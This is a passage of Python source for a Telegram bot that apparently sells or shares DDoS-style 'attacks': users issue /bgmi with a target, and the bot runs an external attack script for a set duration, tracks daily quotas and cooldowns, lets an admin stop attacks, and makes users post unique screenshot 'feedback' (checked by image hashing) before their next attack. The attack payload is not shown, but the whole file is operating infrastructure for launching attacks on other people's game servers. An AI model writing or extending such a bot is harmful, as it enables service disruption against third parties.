            user_attack_count[sender_user_id] = max(0, user_attack_count.get(sender_user_id, 1) - 1)
            if user_attack_count.get(sender_user_id, 0) == 0: user_attack_count.pop(sender_user_id, None)
            user_last_attack_time.pop(sender_user_id, None)
        running_attacks.pop(sender_user_id, None)

    except Exception as e:
        error_msg = f"❌ **Error:** Failed to start the attack process."
        logging.error(f"Error starting subprocess for user {sender_user_id}. Command: '{full_command}'. Error: {e}", exc_info=True)
        try: bot.reply_to(message, f"{error_msg}\nDetails: `{str(e)}`\nReport this to the admin.", parse_mode='Markdown')
        except Exception: pass
        if not is_admin:
            user_attack_count[sender_user_id] = max(0, user_attack_count.get(sender_user_id, 1) - 1)
            if user_attack_count.get(sender_user_id, 0) == 0: user_attack_count.pop(sender_user_id, None)
            user_last_attack_time.pop(sender_user_id, None)
        running_attacks.pop(sender_user_id, None)


# ============================================================
# --- MONITORING, FEEDBACK, STOP, ADMIN UTILS ---
# ============================================================

def monitor_attack(sender_user_id):
    """Monitors a running attack process. Sets feedback requirement on completion/timeout."""
    attack_info = running_attacks.get(sender_user_id)
    if not attack_info or not isinstance(attack_info, dict) or 'process' not in attack_info:
        logging.error(f"[Monitor Error] Invalid/missing attack details for {sender_user_id} in running_attacks. Aborting monitor.")
        return

    process = attack_info['process']
    expected_duration = attack_info['expected_duration']
    target_str = attack_info['target']
    original_message_id = attack_info['original_message_id']
    chat_id = attack_info['original_chat_id']
    original_first_name = attack_info.get('user_first_name', 'User')
    safe_first_name = f"`{original_first_name}`"
    start_time = attack_info['start_time']
    process_pid = attack_info['pid']

    logging.info(f"[Monitor] Started: User={sender_user_id}, Target={target_str}, PID={process_pid}, Expected={expected_duration}s")

    completion_status = "UNKNOWN"
    stdout_data, stderr_data = "", ""
    return_code = None
    success_for_feedback = False
    elapsed_time = 0
    status_emoji = "⚪" # Default

    try:
        timeout_buffer = max(15, min(30, expected_duration * 0.1))
        timeout_duration = expected_duration + timeout_buffer
        logging.debug(f"[Monitor {sender_user_id} PID:{process_pid}] Waiting with timeout: {timeout_duration:.1f}s")

        stdout_data, stderr_data = process.communicate(timeout=timeout_duration)
        return_code = process.returncode
        elapsed_time = time.time() - start_time

        if return_code == 0:
            completion_status = f"Completed Successfully"
            status_emoji = "✅"
            success_for_feedback = True
            logging.info(f"[Monitor] Success: User={sender_user_id}, Target={target_str}, PID={process_pid}. Time: {elapsed_time:.1f}s.")
        else:
            completion_status = f"Finished with Error (Code: {return_code})"
            status_emoji = "❌"
            logging.warning(f"[Monitor] Error Exit: User={sender_user_id}, Target={target_str}, PID={process_pid}. Code: {return_code}, Time: {elapsed_time:.1f}s.")
            if stderr_data: logging.warning(f"[Monitor {sender_user_id} PID:{process_pid}] Stderr: {stderr_data.strip()[:500]}")
            if stdout_data: logging.info(f"[Monitor {sender_user_id} PID:{process_pid}] Stdout: {stdout_data.strip()[:500]}")

    except subprocess.TimeoutExpired:
        elapsed_time = time.time() - start_time
        logging.warning(f"[Monitor] Timeout: User={sender_user_id}, Target={target_str}, PID={process_pid}. Expected: {expected_duration}s, Actual: >{elapsed_time:.1f}s. Terminating.")
        success_for_feedback = True
        status_emoji = "⏱️"

        if process.poll() is None:
            try:
                logging.info(f"[Monitor {sender_user_id} PID:{process_pid}] Attempting terminate()...")
                process.terminate()
                try: process.wait(timeout=5)
                except subprocess.TimeoutExpired: pass
                if process.poll() is None:
                    logging.warning(f"[Monitor {sender_user_id} PID:{process_pid}] Terminate failed, attempting kill()...")
                    process.kill()
                    try: process.wait(timeout=3)
                    except subprocess.TimeoutExpired: pass
                    if process.poll() is None:
                         logging.error(f"[Monitor Error] KILL FAILED for User={sender_user_id}, PID={process_pid}. Process may be orphaned.")
                         completion_status = "Timed Out (Kill Failed)"
                         status_emoji = "🆘"
                         success_for_feedback = False
                    else:
                         logging.info(f"[Monitor {sender_user_id} PID:{process_pid}] Kill successful.")
                         completion_status = "Timed Out (Forcefully Killed)"
                else:
                    logging.info(f"[Monitor {sender_user_id} PID:{process_pid}] Terminate successful.")
                    completion_status = "Timed Out (Terminated)"
            except Exception as term_err:
                logging.error(f"[Monitor Error] Error during termination/kill for User={sender_user_id}, PID={process_pid}: {term_err}", exc_info=True)
                completion_status = "Timed Out (Termination Error)"
                status_emoji = "🆘"
                success_for_feedback = False
        else:
             completion_status = "Timed Out (Finished Near Timeout)"
             return_code = process.returncode
             logging.info(f"[Monitor {sender_user_id} PID:{process_pid}] Process finished with code {return_code} just before/during timeout handling.")
             if return_code != 0:
                 status_emoji = "⚠️"
                 success_for_feedback = False

    except Exception as e:
        elapsed_time = time.time() - start_time
        completion_status = f"Monitor Error ({type(e).__name__})"
        status_emoji = "🆘"
        success_for_feedback = False
        logging.error(f"[Monitor Error] Unexpected error monitoring User={sender_user_id}, PID={process_pid}: {e}", exc_info=True)

    finally:
        current_attack_info_final = running_attacks.get(sender_user_id)
        if current_attack_info_final is None or current_attack_info_final.get('pid') != process_pid:
            logging.info(f"[Monitor] Final Check Failed: Attack state for User={sender_user_id} (Original PID: {process_pid}) was modified or removed externally. Monitor exiting.")
            return

        logging.info(f"[Monitor] Finalizing: User={sender_user_id}, PID={process_pid}. Status='{completion_status}'. Feedback required: {success_for_feedback and sender_user_id != admin_id}")

        is_admin = sender_user_id == admin_id
        feedback_required_now = success_for_feedback and not is_admin
        if feedback_required_now:
            users_needing_feedback.add(sender_user_id)
            logging.info(f"[Monitor] User {sender_user_id} now requires feedback.")

        # --- Construct Completion Message (NEW STYLE - FIXED) ---
        safe_stderr_snippet = ""
        if stderr_data and status_emoji in ["❌", "⚠️", "🆘"] and return_code != 0:
             sanitized = stderr_data.strip().replace("`", "'")[:150]
             safe_stderr_snippet = f"\n🗒️ **Details:** `{sanitized}`{'...' if len(stderr_data.strip()) > 150 else ''}"

        completion_lines = [
            f"♦𝐀𝐓𝐓𝐀𝐂𝐊 𝐂𝐎𝐌𝐏𝐋𝐄𝐓𝐄♦\n",
            f"┣• 𝐃𝐞𝐚𝐫 - {safe_first_name}👑",
            f"┣• 💠𝐓𝐚𝐫𝐠𝐞𝐭 - `{target_str}`",
            f"┣• 💠𝐓𝐢𝐦𝐞 - `{expected_duration}`s/{elapsed_time:.1f}s 🏃💨",
            f"┗• 𝐒𝐭𝐚𝐭𝐮𝐬 - {completion_status}"
        ]

        if safe_stderr_snippet:
            completion_lines.append(safe_stderr_snippet)

        if feedback_required_now:
             completion_lines.append(f"\n⚠️𝙵𝚎𝚎𝚍𝚋𝚊𝚌𝚔 𝚁𝚎𝚚𝚞𝚒𝚛𝚎𝚖𝚎𝚗𝚝 𝙰𝚙𝚙𝚕𝚢❗𝙱𝚎𝚏𝚘𝚛𝚎 𝙰𝚌𝚌𝚎𝚙𝚝 𝚈𝚘𝚞𝚛 𝙽𝚎𝚡𝚝 𝙰𝚝𝚝𝚊𝚌𝚔")

        # FIX: Wrap the @ mention in backticks
        completion_lines.append(f"\nＴｅａｍ－Ｓ４ officiａｌ")
        completion_message = "\n".join(completion_lines)

        # --- Send Notifications ---
        message_sent_to_user_chat = False
        try:
            bot.send_message(str(chat_id), completion_message, reply_to_message_id=original_message_id, parse_mode='Markdown', allow_sending_without_reply=True)
            message_sent_to_user_chat = True
        except apihelper.ApiException as e:
             logging.error(f"[Monitor Error] API Error sending completion to chat {chat_id} for user {sender_user_id}: ({e.error_code}) {e.description}")
             err_desc_lower = e.description.lower()
             if "reply message not found" in err_desc_lower or "message to reply not found" in err_desc_lower:
                 logging.warning(f"[Monitor Warning] Original message {original_message_id} deleted in chat {chat_id}. Sending completion without reply.")
                 try:
                     bot.send_message(str(chat_id), completion_message, parse_mode='Markdown')
                     message_sent_to_user_chat = True
                 except apihelper.ApiException as e2:
                      logging.error(f"[Monitor Error] API Error sending direct completion to chat {chat_id} for user {sender_user_id}: ({e2.error_code}) {e2.description}")
                 except Exception as e2:
                      logging.error(f"[Monitor Error] Unexpected error sending direct completion to chat {chat_id} for user {sender_user_id}: {e2}")
             elif "bot was blocked by the user" in err_desc_lower or "user is deactivated" in err_desc_lower:
                  logging.info(f"[Monitor Info] Cannot send completion to user {sender_user_id} (Blocked/Deactivated).")
             elif "chat not found" in err_desc_lower:
                  logging.info(f"[Monitor Info] Cannot send completion to chat {chat_id} (Chat not found/Bot kicked?).")
        except Exception as e:
            logging.error(f"[Monitor Error] Unexpected error sending completion to chat {chat_id} for user {sender_user_id}: {e}", exc_info=True)

        # Fallback to PM
        if not message_sent_to_user_chat and str(chat_id) != str(sender_user_id):
            logging.info(f"[Monitor] Attempting PM fallback notification to user {sender_user_id}.")
            try:
                fallback_msg = completion_message + "\n\n*(Notification sent privately as sending to the original chat failed)*"
                bot.send_message(str(sender_user_id), fallback_msg, parse_mode='Markdown')
            except apihelper.ApiException as pm_err:
                 logging.error(f"[Monitor Error] API Error sending fallback PM completion to user {sender_user_id}: ({pm_err.error_code}) {pm_err.description}")
            except Exception as pm_err:
                logging.error(f"[Monitor Error] Unexpected error sending fallback PM completion to user {sender_user_id}: {pm_err}")

        # Notify admin
        try:
            admin_completion_msg = completion_message + f"\n\n(Admin Info: PID `{process_pid}`)"
            bot.send_message(str(admin_id), admin_completion_msg, parse_mode='Markdown')
        except apihelper.ApiException as e:
            logging.error(f"[Monitor Error] API Error sending completion message to admin ({admin_id}) for user {sender_user_id}: ({e.error_code}) {e.description}")
        except Exception as e:
             logging.error(f"[Monitor Error] Unexpected error sending completion message to admin ({admin_id}) for user {sender_user_id}: {e}")

        # --- Final Cleanup ---
        final_pop = None
        final_attack_info = running_attacks.get(sender_user_id)
        if final_attack_info and final_attack_info.get('pid') == process_pid:
            final_pop = running_attacks.pop(sender_user_id, None)

        if final_pop:
            logging.info(f"[Monitor] Cleaned up state for User={sender_user_id}, PID={process_pid}.")
        else:
             logging.warning(f"[Monitor Warning] Failed to cleanup state for User={sender_user_id}, PID={process_pid}. Entry might have been removed concurrently.")


# --- PHOTO FEEDBACK HANDLER ---
@bot.message_handler(content_types=['photo'])
def handle_photo_feedback(message):
    """Handles photo messages as feedback if the user requires it."""
    chat_id = str(message.chat.id)
    sender_user_id = str(message.from_user.id)
    user_info = message.from_user
    safe_first_name = f"`{user_info.first_name}`" if user_info.first_name else "`User`"
    is_admin = sender_user_id == admin_id

    if not is_admin and sender_user_id not in users_needing_feedback:
        return
    if not is_allowed_chat(chat_id, sender_user_id):
        logging.warning(f"Feedback photo from {sender_user_id} ignored (sent in disallowed chat {chat_id}).")
        return

    logging.info(f"Processing potential feedback photo: User={sender_user_id}, Name={user_info.first_name}, Chat={chat_id}.")
    processing_msg = None
    try:
        processing_msg = bot.reply_to(message, f"⏳ Processing feedback image from {safe_first_name}...")

        if not message.photo: raise ValueError("No photo data found in message.")
        photo_to_process = message.photo[-1]
        logging.debug(f"Processing photo ID: {photo_to_process.file_id} Size: {photo_to_process.width}x{photo_to_process.height}")

        file_info = bot.get_file(photo_to_process.file_id)
        if not file_info or not file_info.file_path: raise ConnectionError("Failed to get file info from Telegram API.")
        file_url = f"https://api.telegram.org/file/bot{bot_token}/{file_info.file_path}"

        logging.debug(f"Downloading feedback image for {sender_user_id} from {file_url}")
        response = requests.get(file_url, stream=True, timeout=30)
        response.raise_for_status()
        image_bytes = response.content
        if not image_bytes: raise ValueError("Downloaded image data is empty.")

        logging.debug(f"Image downloaded ({len(image_bytes)} bytes). Calculating hash...")
        img = Image.open(io.BytesIO(image_bytes))
        if img.mode in ('RGBA', 'P'): img = img.convert('RGB')
        current_hash = imagehash.phash(img)
        current_hash_str = str(current_hash)
        logging.info(f"Feedback Hash calculated for {sender_user_id}: {current_hash_str}")

        is_duplicate_or_similar = False
        min_diff_found = float('inf')
        if not is_admin:
            previous_hashes = user_feedback_hashes.get(sender_user_id, set())
            if previous_hashes:
                logging.debug(f"Comparing hash {current_hash_str} against {len(previous_hashes)} previous hashes for {sender_user_id}.")
                for old_hash_str in previous_hashes:
                    try:
                        if len(old_hash_str) != len(current_hash_str) or not all(c in '0123456789abcdef' for c in old_hash_str.lower()):
                             logging.warning(f"Skipping invalid stored hash '{old_hash_str}' for user {sender_user_id}.")
                             continue
                        old_hash = imagehash.hex_to_hash(old_hash_str)
                        hash_diff = current_hash - old_hash
                        min_diff_found = min(min_diff_found, hash_diff)
                        if hash_diff <= FEEDBACK_HASH_SIMILARITY_THRESHOLD:
                            is_duplicate_or_similar = True
                            logging.warning(f"Feedback REJECTED: User={sender_user_id}, Hash={current_hash_str} too similar to Old={old_hash_str} (Diff: {hash_diff} <= Threshold: {FEEDBACK_HASH_SIMILARITY_THRESHOLD}).")
                            break
                    except ValueError as ve:
                         logging.warning(f"Error converting stored hash '{old_hash_str}' for user {sender_user_id}: {ve}")
                    except Exception as hash_comp_err:
                        logging.warning(f"Error comparing hashes {current_hash_str} and {old_hash_str} for {sender_user_id}: {hash_comp_err}")
            else:
                 logging.debug(f"First feedback hash for user {sender_user_id}.")

        final_reply_text = ""
        if is_duplicate_or_similar:
            final_reply_text = (f"⚠️ **Feedback Rejected** ⚠️\n{safe_first_name}, this image is too similar to previously submitted feedback (Similarity <= {FEEDBACK_HASH_SIMILARITY_THRESHOLD}). "
                                f"Please send a **different and unique** screenshot.")
        else:
            min_diff_str = str(min_diff_found) if min_diff_found != float('inf') else 'N/A (First/Admin)'
            logging.info(f"Feedback ACCEPTED: User={sender_user_id}, Hash={current_hash_str} (Min Diff: {min_diff_str}).")

            if not is_admin:
                if sender_user_id not in user_feedback_hashes: user_feedback_hashes[sender_user_id] = set()
                user_hashes = user_feedback_hashes[sender_user_id]
                user_hashes.add(current_hash_str)
                if len(user_hashes) > MAX_STORED_HASHES_PER_USER:
                    try:
                        removed_hash = user_hashes.pop()
                        logging.debug(f"Trimmed hash history for {sender_user_id}, removed {removed_hash}. New size: {len(user_hashes)}")
                    except KeyError: pass
                users_needing_feedback.discard(sender_user_id)
                logging.info(f"Feedback requirement cleared for user {sender_user_id}.")
                final_reply_text = f"✅ **Feedback Accepted!** ✅\nThank you, {safe_first_name}. You can now start another attack when ready."
            else:
                 final_reply_text = f"✅ Admin image processed. Hash: `{current_hash_str}`."

            if not is_admin:
                 try:
                     admin_feedback_msg = (f"📸 Feedback accepted from {safe_first_name} (`{sender_user_id}`).\n"
                                           f"   Hash: `{current_hash_str}` (Min Diff: {min_diff_str})\n"
                                           f"   User feedback requirement cleared.")
                     bot.send_photo(str(admin_id), photo_to_process.file_id, caption=admin_feedback_msg, parse_mode='Markdown')
                 except Exception as admin_notify_err:
                      logging.warning(f"Could not notify admin about accepted feedback from {sender_user_id}: {admin_notify_err}")

        try:
            bot.reply_to(message, final_reply_text, parse_mode='Markdown')
        except apihelper.ApiException as e:
             logging.error(f"API Error sending final feedback reply to {sender_user_id}: ({e.error_code}) {e.description}")
        except Exception as e:
             logging.error(f"Unexpected Error sending final feedback reply to {sender_user_id}: {e}")
        if processing_msg:
            try: bot.delete_message(chat_id, processing_msg.message_id)
            except Exception: pass

    except requests.exceptions.RequestException as e:
        logging.error(f"Feedback Error (Download): User={sender_user_id}. Error: {e}", exc_info=True)
        err_reply = "❌ **Download Error**\nFailed to download image from Telegram. Check connection or try again."
        try: bot.reply_to(message, err_reply)
        except Exception: pass
    except UnidentifiedImageError:
         logging.warning(f"Feedback Error (Format): User={sender_user_id}. PIL couldn't identify image.")
         err_reply = "❌ **Invalid Image Format**\nPlease send a standard image format (like JPG or PNG)."
         try: bot.reply_to(message, err_reply)
         except Exception: pass
    except (ValueError, ConnectionError, OSError) as e:
         logging.error(f"Feedback Error (Processing): User={sender_user_id}. Error: {e}", exc_info=True)
         err_reply = f"❌ **Processing Error**\nCould not process the image data: {str(e)}"
         try: bot.reply_to(message, err_reply)
         except Exception: pass
    except Exception as e:
        logging.error(f"Feedback Error (Unexpected): User={sender_user_id}. Error: {e}", exc_info=True)
        err_reply = f"❌ **Unexpected Error**\nFailed to process feedback. Try again or contact admin.\nError: `{type(e).__name__}`"
        try: bot.reply_to(message, err_reply, parse_mode='Markdown')
        except Exception: pass

    if processing_msg:
        try: bot.delete_message(chat_id, processing_msg.message_id)
        except Exception: pass


# --- Stop Attack Handler ---
@bot.callback_query_handler(func=lambda call: call.data.startswith('stop_attack_'))
def handle_stop_attack(call):
    """Handles the 'Stop Attack' button callback (Admin only)."""
    admin_user_id = str(call.from_user.id)
    if admin_user_id != admin_id:
        bot.answer_callback_query(call.id, "🚫 Action Denied: Admin only.", show_alert=True)
        return

    try:
        user_id_to_stop = call.data.split('_')[2]
    except IndexError:
        logging.error(f"[Admin Stop Error] Invalid callback data: {call.data}")
        bot.answer_callback_query(call.id, "❌ Error: Invalid stop command data.", show_alert=True)
        return

    logging.info(f"[Admin Action] Received request from Admin {admin_user_id} to stop attack for User ID: {user_id_to_stop}")

    # --- CRITICAL SECTION ---
    attack_info = running_attacks.get(user_id_to_stop)
    process_to_stop = None
    process_pid = None
    target_info = "N/A"
    original_user_first_name = "User"
    removed_info = None

    if attack_info and isinstance(attack_info, dict) and 'process' in attack_info:
        process_to_stop = attack_info['process']
        process_pid = attack_info.get('pid')
        target_info = attack_info.get('target', 'N/A')
        original_user_first_name = attack_info.get('user_first_name', 'User')

        removed_info = running_attacks.pop(user_id_to_stop, None)
        if removed_info:
            logging.info(f"[Admin Stop] Removed running attack entry for User={user_id_to_stop}, PID={process_pid} before termination attempt.")
        else:
             logging.warning(f"[Admin Stop] Attack entry for User={user_id_to_stop} PID={process_pid} disappeared before removal completed. Already stopped?")
             attack_info = None
             process_to_stop = None
    else:
        attack_info = None
        process_to_stop = None
    # --- End Critical Section ---

    safe_user_first_name = f"`{original_user_first_name}`"

    if process_to_stop and process_pid:
        stop_status = "Attempting Stop..."
        termination_successful = False
        stop_emoji = "⏳"
        try:
            if process_to_stop.poll() is None:
                logging.info(f"[Admin Stop] Terminating PID: {process_pid} (User: {user_id_to_stop})...")
                process_to_stop.terminate()
                try: process_to_stop.wait(timeout=5)
                except subprocess.TimeoutExpired: pass
                if process_to_stop.poll() is None:
                     logging.warning(f"[Admin Stop] Terminate failed for PID: {process_pid}, killing...")
                     process_to_stop.kill()
                     try: process_to_stop.wait(timeout=3)
                     except subprocess.TimeoutExpired: pass
                     if process_to_stop.poll() is None:
                         stop_status = "Stop Failed (Kill Unresponsive)"
                         stop_emoji = "🆘"
                         logging.error(f"[Admin Stop Error] KILL FAILED for PID: {process_pid} (User: {user_id_to_stop}).")
                     else:
                         stop_status = "Stopped (Forcefully Killed)"
                         stop_emoji = "🛑"
                         termination_successful = True
                         logging.info(f"[Admin Stop] Kill successful for PID: {process_pid}.")
                else:
                    stop_status = "Stopped (Terminated Gracefully)"
                    stop_emoji = "🛑"
                    termination_successful = True
                    logging.info(f"[Admin Stop] Terminate successful for PID: {process_pid}.")
            else:
                stop_status = "Already Finished"
                stop_emoji = "✅"
                termination_successful = True
                logging.info(f"[Admin Stop] Process PID: {process_pid} (User: {user_id_to_stop}) already finished before stop.")

            bot.answer_callback_query(call.id, f"{stop_emoji} {stop_status.split('(')[0].strip()} for {original_user_first_name} ({user_id_to_stop}).")

            if termination_successful and user_id_to_stop != admin_id:
                try:
                    user_stop_notify = (f"⚠️ **Your Attack Stopped by Admin** ⚠️\n\n"
                                        f"Your attack on `{target_info}` was manually stopped by the admin.\n"
                                        f"Final Status: {stop_status}")
                    bot.send_message(str(user_id_to_stop), user_stop_notify, parse_mode='Markdown')
                except Exception as e:
                    logging.warning(f"Could not notify user {user_id_to_stop} about stopped attack: {e}")

            try: # Update admin message
                original_text = call.message.text
                base_lines = []
                for line in original_text.split('\n'):
                    if line.strip().startswith(('📊', '🔑', '⏳')): break
                    base_lines.append(line)
                base_text = "\n".join(base_lines).strip()

                admin_username = f"`@{call.from_user.username}`" if call.from_user.username else f"`Admin ({admin_id})`"
                edited_text = f"{base_text}\n\n---\n*Action by {admin_username}*\n{stop_emoji} **Status:** Attack on `{target_info}` for {safe_user_first_name} {stop_status}"
                bot.edit_message_text(edited_text, chat_id=str(admin_id), message_id=call.message.message_id,
                                      parse_mode='Markdown', reply_markup=None)
            except apihelper.ApiException as edit_err:
                 if "message is not modified" not in str(edit_err).lower() and "message can't be edited" not in str(edit_err).lower() :
                      logging.warning(f"Error editing admin stop message (User: {user_id_to_stop}): {edit_err}")
                 if "message can't be edited" in str(edit_err).lower():
                     try: bot.send_message(str(admin_id), f"ℹ️ Attack by {safe_user_first_name} (`{user_id_to_stop}`) update: {stop_emoji} {stop_status}. (Original message edit failed)", parse_mode='Markdown')
                     except Exception: pass
            except Exception as edit_err:
                 logging.error(f"Unexpected error editing admin stop message: {edit_err}", exc_info=True)
                 try: bot.send_message(str(admin_id), f"ℹ️ Attack by {safe_user_first_name} (`{user_id_to_stop}`) update: {stop_emoji} {stop_status}. (Original message edit failed)", parse_mode='Markdown')
                 except Exception: pass

        except Exception as e:
            stop_status = f"Error During Stop ({type(e).__name__})"
            stop_emoji = "🆘"
            logging.error(f"[Admin Stop Error] Error during stop process for PID: {process_pid} (User: {user_id_to_stop}): {e}", exc_info=True)
            bot.answer_callback_query(call.id, f"❌ Error stopping attack for {user_id_to_stop}. Check logs.", show_alert=True)
            try: # Update admin message on error
                original_text = call.message.text
                base_lines = []
                for line in original_text.split('\n'):
                     if line.strip().startswith(('📊', '🔑', '⏳')): break
                     base_lines.append(line)
                base_text = "\n".join(base_lines).strip()
                edited_text = f"{base_text}\n\n---\n{stop_emoji} **Status:** Error occurred trying to stop attack for {safe_user_first_name} (`{user_id_to_stop}`). Check logs.\n`{str(e)}`"
                bot.edit_message_text(edited_text, chat_id=str(admin_id), message_id=call.message.message_id, parse_mode='Markdown', reply_markup=None)
            except Exception as edit_err:
                 logging.error(f"Error editing admin message after stop *error*: {edit_err}")
                 try: bot.send_message(str(admin_id), f"🆘 Error stopping attack initiated by {safe_user_first_name} (`{user_id_to_stop}`). Cleanup might be incomplete. Check logs.", parse_mode='Markdown')
                 except Exception: pass
    else:
        # Attack not found or already removed
        logging.info(f"[Admin Stop] Request for User={user_id_to_stop}, but no active attack found in state or removed concurrently.")
        bot.answer_callback_query(call.id, "ℹ️ Attack not found or already stopped.", show_alert=False)
        try: # Update admin message if possible
            original_text = call.message.text
            if "Status:" not in original_text:
                 base_lines = []
                 for line in original_text.split('\n'):
                      if line.strip().startswith(('📊', '🔑', '⏳', '---')): break
                      base_lines.append(line)
                 base_text = "\n".join(base_lines).strip()
                 edited_text = f"{base_text}\n\n---\nℹ️ **Status:** Attack no longer running / Not found."
                 bot.edit_message_text(edited_text, chat_id=str(admin_id), message_id=call.message.message_id, parse_mode='Markdown', reply_markup=None)
            else:
                 bot.edit_message_reply_markup(chat_id=str(admin_id), message_id=call.message.message_id, reply_markup=None)
        except apihelper.ApiException as edit_error:
             if "message is not modified" not in str(edit_error).lower():
                  logging.warning(f"Minor error editing admin stop message after attack not found: {edit_error}")
        except Exception as edit_error:
             logging.error(f"Unexpected error editing admin stop message after attack not found: {edit_error}", exc_info=True)


# --- Admin Utility Commands ---
@bot.message_handler(commands=['reset'])
def handle_reset(message):
    """Admin command: Resets state for a specific user."""
    sender_user_id = str(message.from_user.id)
    if sender_user_id != admin_id:
        bot.reply_to(message, "🚫 Access Denied: Admin only.")
        return

    command_parts = message.text.split()
    if len(command_parts) != 2 or not command_parts[1].isdigit():
        bot.reply_to(message, "⚠️ Invalid Format.\nUsage: `/reset <user_id>`\nResets credits, cooldown, feedback status & history.")
        return

    target_user_id = command_parts[1]
    logging.info(f"[Admin Action] Received request to reset state for User ID: {target_user_id}")

    response_lines = []
    count_before = user_attack_count.pop(target_user_id, 0)
    response_lines.append(f"- Daily Attacks: Reset (was {count_before}/{max_daily_attacks}).")
    if user_last_attack_time.pop(target_user_id, None): response_lines.append("- Personal Cooldown: Cleared.")
    users_needing_feedback.discard(target_user_id)
    response_lines.append("- Feedback Requirement: Cleared.")
    if user_feedback_hashes.pop(target_user_id, None): response_lines.append("- Feedback Hash History: Cleared.")

    response_message = f"🔄 **State Reset for User `{target_user_id}`**\n\n" + "\n".join(response_lines)
    response_message += f"\n\nUser now has **{max_daily_attacks}** attacks, no cooldown, and no pending feedback."
    logging.info(f"[Admin Action] State reset completed for user {target_user_id}.")
    try: bot.reply_to(message, response_message, parse_mode='Markdown')
    except Exception as e: logging.error(f"Error sending /reset confirmation: {e}")

@bot.message_handler(commands=['listapproved'])
def handle_list_approved(message):
    """Admin command: Lists users approved for private chat."""
    sender_user_id = str(message.from_user.id)
    if sender_user_id != admin_id:
        bot.reply_to(message, "🚫 Access Denied: Admin only.")
        return

    if not approved_private_users:
        bot.reply_to(message, "ℹ️ No users are currently approved for private chat.")
        return

    response_lines = ["✅ **Approved Private Chat Users:**\n"]
    try: sorted_users = sorted(list(approved_private_users), key=int)
    except ValueError: sorted_users = sorted(list(approved_private_users))

    for user_id in sorted_users:
        try:
            user_info = bot.get_chat(user_id)
            username_str = f" (@{user_info.username})" if user_info.username else ""
            safe_name_str = f"`{user_info.first_name}" + (f" {user_info.last_name}" if user_info.last_name else "") + "`"
            response_lines.append(f"- `{user_id}`: {safe_name_str}{username_str}")
        except apihelper.ApiException as e:
            response_lines.append(f"- `{user_id}`: (Error fetching info: {e.error_code})")
        except Exception as e:
            response_lines.append(f"- `{user_id}`: (Error fetching info: {type(e).__name__})")

    response_lines.append(f"\nTotal Approved: **{len(approved_private_users)}**")
    response = "\n".join(response_lines)

    try:
        if len(response) > 4000:
             response = response[:4000] + "\n... (list truncated)"
        bot.reply_to(message, response, parse_mode='Markdown', disable_web_page_preview=True)
    except apihelper.ApiException as e:
        logging.error(f"API Error sending /listapproved: ({e.error_code}) {e.description}")
        try: bot.reply_to(message, "Error generating list (possible formatting issue). Check logs.")
        except Exception: pass
    except Exception as e:
        logging.error(f"Unexpected error sending /listapproved: {e}")
        try: bot.reply_to(message, "Error generating list. Check logs.")
        except Exception: pass


# --- Help Command ---
@bot.message_handler(commands=['help'])
def show_help(message):
    """Displays the help message."""
    chat_id = str(message.chat.id)
    sender_user_id = str(message.from_user.id)
    is_admin = sender_user_id == admin_id

    help_lines = ["*✨ Bot Command Guide ✨*\n"]
    
    help_lines.append("• FOR attack --> /bgmi")
    help_lines.append("• FOR status --> /check")
    help_lines.append("• FOR tg-id  --> /id")
    help_lines.append("• FOR bot-info --> /help")
    help_lines.append("• FOR pvt. access --> /start")
    
    help_lines.append("⚠️ 𝐅𝐞𝐞𝐝𝐛𝐚𝐜𝐤 𝐑𝐞𝐪𝐮𝐢𝐫𝐞𝐝 ⚠️")
    
    help_lines.append(f"\n---\n*Bot Info:*")
    help_lines.append(f"⏳ Group Cooldown --> {COOLDOWN_TIME}s")
    help_lines.append(f"📊 Daily Attacks: {max_daily_attacks} per user (UTC reset)")
    # FIX: Wrap the @ mention in backticks
    help_lines.append(f"❤️ Credit: I")

    final_help_text = "\n".join(help_lines)
    try:
        bot.reply_to(message, final_help_text, parse_mode='Markdown', disable_web_page_preview=True)
    except apihelper.ApiException as e:
        logging.error(f"API Error sending /help message in chat {chat_id}: ({e.error_code}) {e.description}")
    except Exception as e:
        logging.error(f"Unexpected error sending /help message in chat {chat_id}: {e}")

# --- Main Execution Block ---
if __name__ == '__main__':
    logging.info("-----------------------------")
    if BOT_ID is None:
         logging.critical("CRITICAL: Bot failed to initialize correctly (BOT_ID not set). Exiting.")
         exit(1)
    logging.info(f"Admin User ID: {admin_id}")
    logging.info(f"Allowed Group ID (Group Cooldown): {GROUP_ID}")
    logging.info(f"Required Channels: {REQUIRED_CHANNELS or 'None'}")
    logging.info(f"Max Daily Attacks: {max_daily_attacks}")
    logging.info(f"Cooldown (Personal & Group): {COOLDOWN_TIME}s")
    logging.info(f"Attack Script: {ATTACK_SCRIPT_PATH}")
    logging.info(f"Attack Duration: {MIN_ATTACK_DURATION}-{MAX_ATTACK_DURATION}s")
    logging.info(f"Feedback Hash Threshold: {FEEDBACK_HASH_SIMILARITY_THRESHOLD}")
    logging.info(f"Max Stored Hashes: {MAX_STORED_HASHES_PER_USER}")
    logging.info("-----------------------------")

    logging.info("Starting daily reset scheduler thread...")
    reset_thread = threading.Thread(target=reset_attack_count, daemon=True)
    reset_thread.start()

    logging.info("Starting bot polling...")
    retry_delay = 10
    while True:
        try:
            bot.infinity_polling(timeout=60, long_polling_timeout=70, logger_level=logging.WARNING)
            logging.info("Bot polling stopped cleanly.")
            break

        except requests.exceptions.ReadTimeout as e:
            logging.warning(f"Polling ReadTimeout: {e}. Retrying in {retry_delay}s...")
        except requests.exceptions.ConnectionError as e:
             logging.warning(f"Polling ConnectionError: {e}. Retrying in {retry_delay}s...")
        except apihelper.ApiException as e:
             logging.error(f"Telegram API Exception during polling: ({e.error_code}) {e.description}")
             if e.error_code == 401:
                logging.critical("CRITICAL: Bot token INVALID or revoked (401 Unauthorized). Stopping.")
                break
             elif e.error_code == 409:
                 logging.warning("Polling conflict (409). Another instance running? Retrying in 60s...")
                 retry_delay = 60
             else:
                 logging.warning(f"Retrying polling in {retry_delay}s due to API exception...")
        except Exception as e:
            logging.critical(f"CRITICAL UNEXPECTED ERROR in polling loop: {e}", exc_info=True)
            logging.warning(f"Attempting to restart polling in {retry_delay}s...")
        finally:
            time.sleep(retry_delay)
            if retry_delay < 60: retry_delay += 5

    logging.info("--- Telegram Bot Stopped ---")